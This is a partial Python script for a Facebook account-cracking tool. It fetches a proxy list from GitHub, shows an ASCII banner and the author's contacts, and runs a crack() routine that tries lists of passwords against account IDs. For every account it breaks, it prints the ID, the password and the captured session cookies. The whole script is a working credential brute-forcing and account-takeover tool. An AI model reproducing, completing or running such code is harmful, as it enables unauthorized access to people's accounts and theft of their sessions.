...
princp=[]
try:
	prox= requests.get('https://github.com/AlexFahim333/Test-Aproval/blob/main/Prox.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96m𝗔𝗟𝗘𝗫')
...
os.system('espeak -a 300 " Welcome,   to,  𝗔𝗟𝗘𝗫,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/𝗔𝗟𝗘𝗫.King.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
\033[38;5;46m██    ██ \x1b[38;5;196m██ \033[33;1m██████  \033[37;1m██    ██ \033[34;1m███████ 
\033[38;5;46m██    ██ \x1b[38;5;196m██ \033[33;1m██   ██ \033[37;1m██    ██ \033[34;1m██      
\033[38;5;46m██    ██ \x1b[38;5;196m██ \033[33;1m██████  \033[37;1m██    ██ \033[34;1m███████ 
 \033[38;5;46m██  ██  \x1b[38;5;196m██ \033[33;1m██   ██ \033[37;1m██    ██      \033[34;1m██ 
  \033[38;5;46m████   \x1b[38;5;196m██ \033[33;1m██   ██  \033[37;1m██████  \033[34;1m█████
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38m𝐀𝐋𝐄𝐗 𝐕𝐈𝐑𝐔𝐒 𝟒𝟐𝟎 ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • 𝘼𝙇𝙀𝙓 𝙕𝙐𝘾𝙆𝙀𝙍𝘽𝘼𝙍𝙂 ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38m𝗔𝗹𝗲𝘅𝗙𝗮𝗵𝗶𝗺𝟰𝟮𝟬 ]   ║\33[1;34m   
╠══[Telegram                 • @alexfahim420 ]  ║\33[1;35m 
╠══[TOOLS                    • 𝗢𝗻𝗹𝘆 𝟳 𝗗𝗮𝘆𝘀 𝗙𝗿𝗲𝗲  ]        ║ \33[1;32m   
╠══[VERSION                  • 0.01 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	...
	if TUTUL in ['m']:
		...
		os.system('xdg-open https://t.me/alexfahim420')
	elif TUTUL in ['0']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[𝗔𝗟𝗘𝗫-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#𝗔𝗟𝗘𝗫-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•𝗔𝗟𝗘𝗫-Cp] {idf} • {pw}')     
				...
				#𝗔𝗟𝗘𝗫-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•𝗔𝗟𝗘𝗫-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " 𝗔𝗟𝗘𝗫,  Ok,  id"')
